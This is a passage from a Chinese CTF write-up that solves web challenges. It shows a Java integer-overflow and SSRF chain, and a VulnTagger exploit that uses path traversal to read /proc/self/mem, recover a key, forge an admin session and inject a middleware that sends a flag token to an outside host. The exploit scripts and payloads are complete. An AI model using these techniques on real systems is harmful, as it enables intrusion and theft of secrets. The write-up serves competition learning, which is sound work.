src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840729197-63b43fb1-0880-4ad7-9fe0-9eec3a20ed9c.png#averageHue=%23242629&clientId=u51b156d6-971a-4&from=paste&height=534&id=u11844ec9&originHeight=1068&originWidth=1960&originalType=binary&ratio=2&rotation=0&showTitle=false&size=378854&status=done&style=none&taskId=uea689aaa-862d-4337-a502-1d92cd20eef&title=&width=980" alt="image.png"><br>假如赢了static块里的某个对象，就获取他的level，我们要获取的是flag的level。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840821205-b092d39c-995e-4444-8072-396d0720fa23.png#averageHue=%231f2024&clientId=u51b156d6-971a-4&from=paste&height=681&id=u210143bc&originHeight=1362&originWidth=1528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=185717&status=done&style=none&taskId=u912a1bc3-fd84-4bfd-9274-7661967825a&title=&width=764" alt="image.png"><br>属性设置这里有一些限制，这里其实凭借直觉就知道应该是整数溢出了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841191384-b15dd7a9-0367-49af-9a5e-101055931e67.png#averageHue=%23c1c1c1&clientId=u51b156d6-971a-4&from=paste&height=225&id=ud07b59d2&originHeight=450&originWidth=1722&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63234&status=done&style=none&taskId=ud494ba0b-34a1-4eaa-91f3-04dfa2fd155&title=&width=861" alt="image.png"><br>让防御为负数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841286685-10517899-9798-4154-a2fc-e736be75ae98.png#averageHue=%232a2d33&clientId=u51b156d6-971a-4&from=paste&height=778&id=ua68bfc1e&originHeight=1556&originWidth=2638&originalType=binary&ratio=2&rotation=0&showTitle=false&size=591565&status=done&style=none&taskId=u25da39a5-28e8-42a1-be09-dd3c161e9c5&title=&width=1319" alt="image.png"><br>最后你可以发现返回的是0<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841303144-7521696c-a87d-4d8e-aef3-e3800b0e0757.png#averageHue=%23292c31&clientId=u51b156d6-971a-4&from=paste&height=572&id=u81304641&originHeight=1144&originWidth=2066&originalType=binary&ratio=2&rotation=0&showTitle=false&size=259082&status=done&style=none&taskId=u7bf46a54-170b-46f2-a9d0-c9c90630491&title=&width=1033" alt="image.png"><br>成功levelup进入第一层逻辑<br>第二层就是个ssrf了，域名要包含dubhe，你可以是<code>dubhe.sudo.cc</code>,sudo.cc指向的是localhost，所以就可以了。<br>因此payload依次为</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/pal/cheat?defense=2147483647</span><br><span class="line">http://localhost:8888/pal/battle/flag</span><br><span class="line"></span><br><span class="line">http://localhost:8888/pal/cheat[post]</span><br><span class="line">host=dubhe.sudo.cc<span class="built_in">&amp;</span>data=base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841583726-ba7b9fae-481e-4c38-b82a-0e57c8a3fca1.png#averageHue=%23a9a8a7&clientId=u51b156d6-971a-4&from=paste&height=1080&id=SLTgG&originHeight=2160&originWidth=3526&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1086079&status=done&style=none&taskId=u92eae285-940c-477d-9f3f-f9fb3211d77&title=&width=1763" alt="image.png"><br>最终可以rce。远程环境改为java bash反弹shell即可</p><h1 id="VulnTagger"><a href="#VulnTagger" class="headerlink" title="VulnTagger"></a>VulnTagger</h1><ul><li>代码审计</li><li>读mem拿key</li><li>pytorch inject RCE</li></ul><p>在做这道题之前首先需要去了解一下pytorch这东西，他是处理模型的，pytorch是有漏洞的。<br><a href="https://github.com/trailofbits/fickling">https://github.com/trailofbits/fickling</a><br>他在加载模型的时候对数据会采用pickle反序列化。因此是有漏洞存在的。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710853320258-6073fbb0-aea8-4457-b003-87716943a690.png#averageHue=%23202124&clientId=u51b156d6-971a-4&from=paste&height=550&id=ucc842337&originHeight=1100&originWidth=2158&originalType=binary&ratio=2&rotation=0&showTitle=false&size=224053&status=done&style=none&taskId=u0935c2cb-cfb1-4039-98f3-884dd02ede4&title=&width=1079" alt="image.png"><br>一样的套路，有一个static任意文件读取接口。然后后半段其实挺明确了，利用pickle去执行python代码，但是需要管理员权限，需要个storage_key，这里套路和之前一样，是读取mem内存。<br>题目还给了个bot很奇怪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_urlsafe</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Literal</span>, ParamSpec, TypeVar</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">from</span> rich.logging <span class="keyword">import</span> RichHandler</span><br><span class="line"></span><br><span class="line">logger = getLogger(__name__)</span><br><span class="line">logger.addHandler(RichHandler())</span><br><span class="line">logger.setLevel(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">client = Client(base_url=<span class="string">&quot;http://localhost:8080&quot;</span>)</span><br><span class="line"></span><br><span class="line">_PS = ParamSpec(<span class="string">&quot;_PS&quot;</span>)</span><br><span class="line">_R = TypeVar(<span class="string">&quot;_R&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_exception</span>(<span class="params">func: <span class="type">Callable</span>[_PS, _R]</span>) -&gt; <span class="type">Callable</span>[_PS, _R | <span class="type">Literal</span>[<span class="literal">False</span>]]:</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args: _PS.args, **kwargs: _PS.kwargs</span>) -&gt; _R | <span class="type">Literal</span>[<span class="literal">False</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.exception(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@catch_exception</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">difficulty: <span class="built_in">int</span> = <span class="number">4</span>, token: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span></span>):</span><br><span class="line">    resp = client.post(</span><br><span class="line">        <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;x-pow-token&quot;</span>: (token),</span><br><span class="line">            <span class="string">&quot;x-pow-difficulty&quot;</span>: <span class="built_in">str</span>(difficulty),</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">418</span>:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with status code %d&quot;</span>, resp.status_code)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data: <span class="built_in">str</span> = resp.json()[<span class="string">&quot;bar&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with invalid JSON&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        hashlib.sha256(token.encode() + data.encode())</span><br><span class="line">        .hexdigest()</span><br><span class="line">        .startswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    difficulty = <span class="number">4</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> validate(difficulty):  <span class="comment"># noqa: SIM102</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(validate(difficulty) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(difficulty)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        logger.info(<span class="string">&quot;Failed to validate with difficulty %d&quot;</span>, difficulty)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">    logger.info(<span class="string">&quot;Successfully validated with difficulty %d&quot;</span>, difficulty)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> subprocess.Popen([<span class="string">&quot;/readflag&quot;</span>], stdout=subprocess.PIPE) <span class="keyword">as</span> proc:</span><br><span class="line">        <span class="keyword">assert</span> proc.stdout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> proc.stdout:</span><br><span class="line">            flag = line.decode().strip()</span><br><span class="line">            validate(difficulty, flag)</span><br><span class="line">    logger.info(<span class="string">&quot;Flag submitted&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始我觉得这玩意儿意义不明的。开了个死循环进程，不断地去验证pow，假如通过了就直接把flag放到请求头里。在小伙伴们的思路下知道了是要我们注入一个niceui的middleware。与以往rce不同<br>这里直接放一下哥哥们的exp。<br>首先是读取mem中的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read_mem.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> maps_parser <span class="keyword">import</span> parse_proc_maps</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;/static%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/mem&quot;</span></span><br><span class="line">maps = <span class="string">&quot;http://1.95.11.7:40721/static%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/maps&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(maps)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">maps_parsed = parse_proc_maps(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.makedirs(<span class="string">&quot;./out&quot;</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line">os.system(<span class="string">&quot;rm out/*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">start_mem_int,end_mem_int</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((<span class="string">&quot;1.95.11.7&quot;</span>, <span class="number">40721</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">        request = <span class="string">f&quot;GET <span class="subst">&#123;url&#125;</span> HTTP/1.1\r\nHost: 1.95.11.7:40721\r\nUpgrade-Insecure-Requests: 1\r\nRange: bytes=<span class="subst">&#123;start_mem_int&#125;</span>-<span class="subst">&#123;end_mem_int&#125;</span>\r\nConnection: close\r\n\r\n&quot;</span></span><br><span class="line">        sock.sendall(request.encode())</span><br><span class="line">        response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> t:=sock.recv(<span class="number">8192</span>):</span><br><span class="line">            response+=t</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span>  <span class="string">b&#x27;title&gt;VulnTagger&lt;/title&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response</span><br><span class="line">        <span class="keyword">return</span> response.split(<span class="string">b&quot;\r\n\r\n&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> maps_parsed:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> item.pathname != <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.perms != <span class="string">&quot;rw-p&quot;</span>:<span class="keyword">continue</span></span><br><span class="line">    start_mem_int,end_mem_int = <span class="built_in">int</span>(item.addr_start,<span class="number">16</span>),<span class="built_in">int</span>(item.addr_end,<span class="number">16</span>)</span><br><span class="line">    size = end_mem_int - start_mem_int</span><br><span class="line">    <span class="keyword">if</span> size &gt;= <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(item.addr_start,item.addr_end,item.perms,size,size/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">&quot;MB&quot;</span>)</span><br><span class="line">    filename = <span class="string">f&#x27;<span class="subst">&#123;item.addr_start&#125;</span>_<span class="subst">&#123;item.addr_end&#125;</span>_<span class="subst">&#123;<span class="built_in">str</span>(item.pathname)&#125;</span>&#x27;</span>.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br><span class="line">    outfile = os.path.join(<span class="string">&quot;./out&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(outfile,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(read(start_mem_int,end_mem_int))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>寻找key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#filter_strings.py</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">b64charset = string.ascii_letters + string.digits + <span class="string">&quot;_-&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isbase64safe</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(x <span class="keyword">in</span> b64charset <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;strings -n 22 out/* &gt; /tmp/strings.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./false_positives.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    false_positives = f.readlines()</span><br><span class="line">false_positives = <span class="built_in">list</span>(x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> false_positives)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/strings.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        l = line[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(l) == <span class="number">22</span> <span class="keyword">and</span> isbase64safe(l):</span><br><span class="line">            <span class="keyword">if</span> l <span class="keyword">not</span> <span class="keyword">in</span> false_positives:</span><br><span class="line">                result.add(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p>获取到key后就可以跑出session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_session_server.py</span></span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> ui</span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"><span class="meta">@ui.page(<span class="params"><span class="string">&#x27;/other_page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_page</span>():</span><br><span class="line">    app.storage.browser[<span class="string">&quot;is_admin&quot;</span>] = <span class="literal">True</span></span><br><span class="line">    ui.label(<span class="string">&#x27;Welcome to the other side&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ui.link(<span class="string">&#x27;Visit other page&#x27;</span>, other_page)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">secret_token=sys.argv[<span class="number">1</span>]</span><br><span class="line">ui.run(port=<span class="number">8082</span>,storage_secret=secret_token,show=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_session.py</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">secret_token=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;python3&quot;</span>,<span class="string">&quot;fake_session_server.py&quot;</span>,secret_token])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8082/other_page&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"></span><br><span class="line">p.terminate()</span><br></pre></td></tr></table></figure><p>写一个middleware，这个middleware要注入到进程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#antibot.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line"><span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line"><span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">app.middleware_stack = <span class="literal">None</span></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">add_process_time_header</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">difficulty, token</span>):</span><br><span class="line">        <span class="keyword">import</span> hashlib</span><br><span class="line">        <span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line">        <span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line">        <span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line">        <span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line">        <span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line">        <span class="keyword">import</span> urllib</span><br><span class="line">        <span class="keyword">import</span> string</span><br><span class="line">        <span class="keyword">import</span> json</span><br><span class="line">        <span class="keyword">import</span> itertools</span><br><span class="line">        combinations = itertools.product(string.ascii_letters, repeat=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> combinations:</span><br><span class="line">            res = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">            <span class="keyword">if</span> (hashlib.sha256((token + res).encode()).hexdigest().startswith(<span class="string">&quot;0&quot;</span>*difficulty)):</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    <span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line">    <span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line">    <span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line">    <span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line">    <span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">import</span> json</span><br><span class="line">    <span class="keyword">import</span> itertools</span><br><span class="line">    logger = getLogger(<span class="string">&quot;injected&quot;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    x_pow_token = request.headers.get(<span class="string">&quot;x-pow-token&quot;</span>)</span><br><span class="line">    x_pow_difficulty = request.headers.get(<span class="string">&quot;x-pow-difficulty&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> x_pow_token <span class="keyword">and</span> x_pow_difficulty:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> urllib.request.urlopen(<span class="string">&quot;http://1.1.1.1/x/flag/&quot;</span>+x_pow_token) <span class="keyword">as</span> response:</span><br><span class="line">              <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logger.warning(<span class="string">&quot;pow: %s %s&quot;</span> %(x_pow_difficulty,x_pow_token))</span><br><span class="line">        <span class="built_in">pow</span> = proof_of_work(<span class="built_in">int</span>(x_pow_difficulty),x_pow_token)</span><br><span class="line">        logger.warning(<span class="string">&quot;calculated pow:%s&quot;</span>%<span class="built_in">pow</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(json.dumps(&#123;<span class="string">&quot;bar&quot;</span>:<span class="built_in">pow</span>&#125;),<span class="number">418</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样在死循环中就会识别pow然后中断，将flag放在token里。<br><a href="https://github.com/mix-archive/VulnTagger?tab=readme-ov-file">https://github.com/mix-archive/VulnTagger?tab=readme-ov-file</a><br>官方给了docker，感觉还挺难的说实话。</p><h1 id="Master-of-Profile"><a href="#Master-of-Profile" class="headerlink" title="Master of Profile"></a>Master of Profile</h1><ul><li>wmctf2022的subconverter</li></ul><p>其实没搞懂和2022的题有什么区别。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710855715724-252d8dfd-6312-4ebb-b20d-1a490f1a4b28.png#averageHue=%2313161c&clientId=ud257d492-5fa8-4&from=paste&height=334&id=udf4d07c1&originHeight=668&originWidth=1778&originalType=binary&ratio=2&rotation=0&showTitle=false&size=140170&status=done&style=none&taskId=ua26f026d-279e-4bd2-aad3-28cb92e2ccb&title=&width=889" alt="image.png"><br>在源码中可以看到，当api-mode为false的时候，是会进入2个路由的，getlocal和get，这边直接开启文件读取了。所以很快就能定位api-token，拿到token后我们可以update conf更新配置文件去rce。<br><img 